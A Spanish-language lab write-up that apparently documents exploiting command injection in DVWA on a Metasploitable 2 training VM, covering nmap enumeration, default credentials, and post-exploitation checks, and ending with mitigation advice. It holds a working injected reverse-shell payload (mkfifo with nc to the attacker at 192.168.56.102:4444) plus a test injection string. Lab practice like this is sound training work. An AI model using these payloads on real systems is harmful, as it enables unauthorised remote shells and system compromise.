# ✅ Explotación del Servicio HTTP – Metasploitable 2

## 📌 1. Visión General

Este proyecto se centra en la identificación y explotación de vulnerabilidades en el **servicio HTTP (TCP/80)** que se ejecuta en **Metasploitable 2**. El objetivo es demostrar una **cadena de ataque completa**:

✅ Enumeración  
✅ Descubrimiento de vulnerabilidades  
✅ Ejecución Remota de Código (RCE)  
✅ Reverse Shell  
✅ Compromiso del sistema  

---

## 📌 2. Información del Objetivo y del Atacante

| Componente | Detalles |
|-----------|----------|
| Máquina atacante | Kali Linux |
| IP del atacante | 192.168.56.102 |
| Máquina objetivo | Metasploitable 2 |
| IP del objetivo | 192.168.56.101 |
| Servicio | HTTP (Apache 2.2.8) |
| Aplicación | DVWA (Damn Vulnerable Web App) |

---

## 📌 3. Enumeración Inicial

Se realizó un escaneo de servicios y versiones utilizando **Nmap**:

```bash
nmap -sV -O -p80 192.168.56.101
```

✅ **Resultado**

```text
80/tcp open http Apache httpd 2.2.8 ((Ubuntu) DAV/2)
```

➡️ El objetivo ejecuta un servidor **Apache obsoleto** que aloja **DVWA**, una aplicación web vulnerable.

---

## 📌 4. Acceso a DVWA

DVWA era accesible vía HTTP y permitía el inicio de sesión utilizando credenciales por defecto:

```text
Usuario: admin
Contraseña: password
```

✅ Indica una política de autenticación deficiente
✅ Permite el acceso del atacante sin necesidad de fuerza bruta

---

## 📌 5. Identificación de la Vulnerabilidad – Inyección de Comandos

Dentro de DVWA:

```text
Vulnerabilities → Command Injection
```

Se ejecutó el siguiente payload de prueba:

```text
127.0.0.1; id
```

✅ **Respuesta**

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

✅ Ejecución remota de comandos confirmada (RCE)
✅ Los comandos se ejecutan en el servidor como **www-data**

---

## 📌 6. Explotación – Reverse Shell

### 🔹 Paso 1: Iniciar listener en Kali

```bash
nc -lvnp 4444
```

**Salida esperada:**

```text
listening on [any] 4444 ...
```

### 🔹 Paso 2: Ejecutar el payload en DVWA

```text
127.0.0.1; mkfifo /tmp/f; nc 192.168.56.102 4444 < /tmp/f | /bin/sh >/tmp/f 2>&1
```

✅ Esto crea una tubería FIFO y establece una **reverse shell** hacia el atacante.

---

## 📌 7. Captura Exitosa de la Shell

En el listener de Kali:

```text
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.101] 51058
```

Se obtiene acceso remoto al sistema.

---

## 📌 8. Validación Post-Explotación

### 🔹 Usuario actual

```bash
whoami
```

```text
www-data
```

### 🔹 Información del sistema

```bash
uname -a
```

```text
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
```

### 🔹 Directorio actual

```bash
pwd
```

```text
/var/www/dvwa/vulnerabilities/exec
```

### 🔹 Listado de directorios

```bash
ls -la
```

```text
total 20
drwxr-xr-x  4 www-data www-data 4096 May 20  2012 .
drwxr-xr-x 11 www-data www-data 4096 May 20  2012 ..
drwxr-xr-x  2 www-data www-data 4096 May 20  2012 help
-rw-r--r--  1 www-data www-data 1509 Mar 16  2010 index.php
drwxr-xr-x  2 www-data www-data 4096 May 20  2012 source
```

### 🔹 Identidad del usuario

```bash
id
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### 🔹 Hostname

```bash
hostname
```

```text
metasploitable
```

✅ Acceso remoto completo confirmado
✅ Ejecución de código en el host
✅ Control del sistema de archivos del objetivo

---

## 📌 9. Análisis de Impacto

| Categoría               | Resultado                            |
| ----------------------- | ------------------------------------ |
| Tipo de vulnerabilidad  | Ejecución Remota de Código           |
| Nivel de acceso         | www-data                             |
| Autenticación requerida | No                                   |
| Impacto                 | Crítico                              |
| Riesgo                  | Posible compromiso total del sistema |

Un atacante podría:

* Robar datos
* Modificar archivos
* Subir backdoors
* Escalar privilegios
* Moverse lateralmente

---

## 📌 10. Causa Raíz

* Falta de sanitización de entradas
* Aplicación web vulnerable expuesta
* Credenciales por defecto habilitadas
* Aislamiento de privilegios débil

---

## 📌 11. Recomendaciones de Mitigación

✅ Sanitizar y validar todas las entradas del usuario
✅ Eliminar DVWA de entornos productivos
✅ Deshabilitar credenciales por defecto
✅ Endurecer la configuración de Apache y PHP
✅ Aplicar el principio de mínimo privilegio
✅ Implementar monitorización y logging

---

## 📌 12. Resumen Ejecutivo

Se descubrió una vulnerabilidad crítica de **Ejecución Remota de Código (RCE)** en el servicio HTTP a través del módulo de **Inyección de Comandos** de DVWA. El atacante obtuvo con éxito una **reverse shell** en la máquina objetivo y ejecutó comandos a nivel de sistema de forma remota, confirmando el compromiso total del sistema a través de la interfaz web.

---

## 📌 13. Estado

| Fase                               | Resultado                      |
| ---------------------------------- | ------------------------------ |
| Enumeración                        | ✅ Completa                     |
| Descubrimiento de vulnerabilidades | ✅ RCE identificada             |
| Explotación                        | ✅ Reverse shell obtenida       |
| Post-explotación                   | ✅ Acceso al sistema confirmado |

